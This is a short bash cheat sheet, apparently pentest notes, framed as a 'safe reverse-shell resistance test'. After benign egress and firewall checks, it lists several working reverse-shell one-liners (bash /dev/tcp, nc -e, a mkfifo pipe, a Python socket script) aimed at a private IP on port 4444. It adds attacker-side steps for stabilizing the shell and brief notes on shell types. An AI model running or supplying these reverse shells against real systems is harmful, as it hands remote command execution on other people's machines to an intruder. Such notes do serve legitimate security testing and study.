#!/bin/bash

```Safe Reverse-Shell Resistance Test (Step-by-step)```

# local machine
nc -vlnp 4444           # Start listener on your local machine
rlwrap nc -lvnp 4444    # Better / Alternative Tools

# server test
curl -I https://example.com                 # From server: test outbound connectivityw
echo "TEST_CONNECTION" | nc 10.8.56.1 4444  # From server: test raw TCP outbound
sh -c "echo EXEC_TEST"                      # From server: test process execution visibility
nc -vz 10.8.56.1 4444                       # From server: check allowed network egress
nslookup example.com                        # From server: check DNS egress
iptables -L -v -n                           # On server: check firewall rules
nft list ruleset
ps aux                                      # On server: check execution logging
python3 -c "print('test')"                  # On server: Simulate “attack-like behavior” safely
sh -c "echo SAFE_SIMULATION"

# reverse shll command
/bin/sh -i >& /dev/tcp/10.8.56.2/4444 0>&1
nc 10.8.56.2 4444 -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.56.2 4444 > /tmp/f
/bin/sh -l > /dev/tcp/10.8.56.2/4444 0<&1 2>&1
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
s.connect(("10.8.56.2",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); \
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'

# shell stabilization on local
python3 -c 'import pty; pty.spawn("/bin/bash")'  # 1. Upgrade to a pseudo-terminal (PTY).  
Ctrl + Z stty raw -echo; fg                      # 2. Put your terminal into raw mode (attacker machine).  
export TERM=xterm                                # 3. Fix terminal environment (target side). 


## Concepts
```
1. Types of Shells You'll Encounter
   - Linux/Unix Shells
      /bin/sh
      bash
      zsh
      csh / tcsh
      Restricted shells (rbash, rksh)
   - Windows Shells
     cmd.exe
     PowerShell

2. How Shells Are Commonly Obtained
    - Reverse shells — target connects back to the attacker
    - Bind shells — target listens for incoming connections
    - Web shells — commands executed via web interfaces
    - Framework-based shells — enhanced shells from tooling

3. Assessing Shell Quality
   - Unstable Shell (dumb shell)
   - Stable Shell
```
